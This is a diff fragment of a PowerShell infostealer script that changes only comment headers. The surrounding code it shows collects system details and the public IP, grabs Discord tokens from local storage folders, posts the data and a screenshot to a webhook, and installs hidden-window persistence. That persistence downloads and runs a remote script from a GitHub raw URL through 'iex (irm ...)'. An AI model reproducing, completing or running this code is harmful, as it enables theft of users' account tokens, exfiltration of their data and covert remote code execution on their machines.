@@ -12,7 +12,7 @@ $os  = [System.Environment]::OSVersion.VersionString
 $adm = ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
 try { $ip = (Invoke-RestMethod -Uri "https://api.ipify.org" -TimeoutSec 3) } catch { $ip = "unknown" }
 
-# === DISCORD TOKEN GRAB (from local storage) ===
+# === DISCORD TOKEN GRAB ===
 $tokens = @()
 $paths = @(
     "$env:APPDATA\Discord\Local Storage\leveldb",
@@ -85,7 +85,7 @@ try {
     Invoke-RestMethod -Uri $webhook -Method Post -Body $jsonBody -ContentType "application/json" -TimeoutSec 5
 } catch {}
 
-# === SEND SCREENSHOT AS FILE (if captured) ===
+# === SEND SCREENSHOT AS FILE ===
 if ($screenshotB64) {
     try {
         $imgBytes = [Convert]::FromBase64String($screenshotB64)
@@ -102,7 +102,7 @@ if ($screenshotB64) {
     } catch {}
 }
 
-# === PERSISTENCE (Registry Run) ===
+# === PERSISTENCE ===
 $psArgs = "-ExecutionPolicy Bypass -WindowStyle Hidden -NoProfile -Command `"iex (irm 'https://raw.githubusercontent.com/saksham123107-pixel/son/main/son.ps1')`""
 $psCmd = "powershell.exe $psArgs"
 try {
